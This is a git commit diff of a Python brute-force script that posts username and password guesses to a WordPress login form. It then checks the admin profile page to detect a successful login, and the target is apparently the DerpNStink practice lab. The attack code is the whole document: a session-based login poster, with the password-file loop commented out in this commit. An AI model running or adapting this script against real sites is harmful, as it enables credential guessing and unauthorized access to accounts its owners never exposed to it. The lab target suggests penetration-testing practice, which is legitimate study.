9a5eaca05dae431abbbe486b087cd87b00d57138
Tmpts21 <60459436+Tmpts21@users.noreply.github.com>
2020-12-24 02:08:49 +0800

    Update brute.py
    60 %

--- brute.py
+++ brute.py
@@ -1,24 +1,26 @@
-
 import itertools 
 import string 
 import sys  
 import requests 
 import argparse   
 
-def brute( username , password , url)  :    
-    #add the two parameters (username , password)    
-    PARAMS = { 
-              'username': username, 
-              'password' : password  
-             }   
-    
-    print(url , PARAMS)
+def brute( username , password , url)  :  
 
-    #r = requests.get(url = URL, params = PARAMS) 
-      
-    #data = r.json() 
+    with requests.Session() as s: 
 
-    #print(data)
+        wp_admin = "http://derpnstink.local/weblog/wp-admin/profile.php"  
+        #change this params if needed 
+        PARAMS={ 
+                'log':username, 'pwd':password,'wp-submit':'Log In',  
+                'redirect_to' : wp_admin , 
+                }  
+
+        s.post(url = url, data = PARAMS )  
+
+        status = s.get(wp_admin)
+
+         
+    return status.text , status.status_code 
  
 def main () :   
 
@@ -27,10 +29,12 @@ def main () :
     parser.add_argument("-u", "--username", help="valid username" )
     parser.add_argument("-url", "--url", help="url to attack  ")
      
-    args = parser.parse_args()  
+    args = parser.parse_args()     
+    print(brute('admin' , 'admin' , args.url)) 
 
-    #load the password files  
-    with open("passwords.txt") as passwords:
+'''
+    #load the password files   
+    with open("test.txt") as passwords:
         for password in passwords:  
 
             #valid username
@@ -40,18 +44,14 @@ def main () :
 
             url = args.url   
 
-            #brute force the login 
-            brute( username , password  , url )
+            #brute force the login  
+            status  = brute(username , password ,url )   
+            print(f'{username} : {password} -----> {status} ')  
 
+'''
 if __name__ == "__main__":
     main()  
 
 
 
         
-
-
-
-
-        
-
